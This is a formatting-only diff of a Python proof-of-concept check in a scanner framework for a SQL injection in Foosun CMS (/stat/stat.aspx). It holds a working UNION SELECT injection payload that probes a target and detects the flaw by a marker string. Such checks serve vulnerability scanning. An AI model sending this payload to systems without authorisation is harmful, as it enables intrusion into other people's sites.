@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Foosun_0001' # 平台漏洞编号，留空
+    vuln_id = 'Foosun_0001'  # 平台漏洞编号，留空
     name = '风讯CMS SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-06-01'  # 漏洞公布时间
     desc = '''
         风讯CMS /stat/stat.aspx?statid=1 SQL注入漏洞。
@@ -17,6 +18,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '风讯CMS'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '58ec2f03-2801-46bd-b779-97917177d661'
@@ -30,12 +32,13 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             hh = hackhttp.hackhttp()
-            #ref: http://www.wooyun.org/bugs/wooyun-2010-0117395
+            # ref: http://www.wooyun.org/bugs/wooyun-2010-0117395
             payload = "/stat/stat.aspx?statid=1%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,XINGGUANGDANIU,NULL,NULL--"
             url = self.target + payload
-            code, head, res, errcode, _ = hh.http(url, user_agent="Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X M    etaSr 1.0")
+            code, head, res, errcode, _ = hh.http(
+                url, user_agent="Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X M    etaSr 1.0")
 
             if code == 200 and 'XINGGUANGDANIU' in res:
                 #security_hole(url + '   found sql injection!')
@@ -47,6 +50,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
